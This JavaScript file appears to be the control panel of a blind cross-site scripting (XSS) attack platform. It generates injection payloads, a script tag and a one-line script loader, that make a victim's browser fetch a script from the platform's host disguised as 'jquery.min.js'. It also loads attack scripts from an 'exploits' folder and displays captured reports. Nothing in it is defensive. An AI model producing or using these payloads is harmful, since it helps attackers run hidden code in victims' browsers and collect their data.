var spl = []
var path='';
var spl = location.href.split('/');

for(i=1; i<spl.length-1;i++){
	path += '/' + spl[i];
}

function HighLight(){
	$('pre code').each(function(i, block) {hljs.highlightBlock(block);});
}

function getPayload(id,title){
	$('#expname')[0].innerText = title;
	$('#html')[0].innerText = '<script src="' + path + '/jquery.min.js?ver=' + id + '"><\/script>'
	$('#javascript')[0].innerText =  'document.body.appendChild(document.createElement(\'script\')).src=\'' + path + '/jquery.min.js?ver=' + id + '\''
	$('pre code').each(function(i, block) {
		hljs.highlightBlock(block);
	});
}

function showURL(){
	setTimeout(function(){
		getPayload('1','Blind XSS');
		HighLight();
	},500)
}

function editExp(id){
	exp = $('#code' + id)[0].value
	$('#codefrom1')[0].innerText = exp; 
	$('#codeto1')[0].value = exp;
	HighLight();
}

function getExp(){
	expName = $("#sel2 option:selected").text();
	var xhr = new XMLHttpRequest();
	xhr.open('GET', './exploits/' + expName + '?' + Math.random(), false); 
	xhr.send(null);
	if(xhr.status == 200){
		$('#codefrom')[0].innerText = xhr.responseText;
		$('#codeto')[0].value = xhr.responseText;
		$('#code')[0].style.display = '';
		HighLight();
	}
}

	function showExp(id){

		$('#Report')[0].innerHTML = '<form id="delete" method="post"><input type="hidden" name="action" value="delete"><input type="hidden" name="id" value="' + id + '"></form>\
		<div class="btn-group btn-group-justified">\
		<div class="btn-group">\
		<button type="submit" class="btn btn-default btn-block" onclick="$(\'#Report\')[0].innerHTML=\'\'">Collapse report</button>\
		</div>\
		<div class="btn-group">\
		<button form="delete" type="submit" class="btn btn-danger">Delete report</button>\
		</div>\
		</div>\n' + $('#repid' + id)[0].value;

		HighLight();
	}